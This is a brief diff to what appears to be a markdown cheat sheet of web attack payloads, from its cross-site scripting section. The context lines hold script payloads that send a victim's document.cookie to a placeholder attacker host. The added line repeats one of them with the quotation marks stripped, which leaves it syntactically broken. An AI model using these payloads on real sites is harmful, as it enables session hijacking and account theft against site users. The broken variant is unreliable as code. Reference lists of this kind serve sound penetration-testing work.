@@ -166,6 +166,7 @@ document.write
 ```html
 <script>var i=new Image;i.src="http://[IP OR DOMAIN : PORT]/?"+document.cookie;</script>
 <script>document.location='http://[IP OR DOMAIN : PORT]/?'+document.cookie;</script>
+<script>document.location=http://[IP OR DOMAIN : PORT]/?+document.cookie;</script>
 ```
 
 ## LOCAL FILE INCLUSION (LFI)
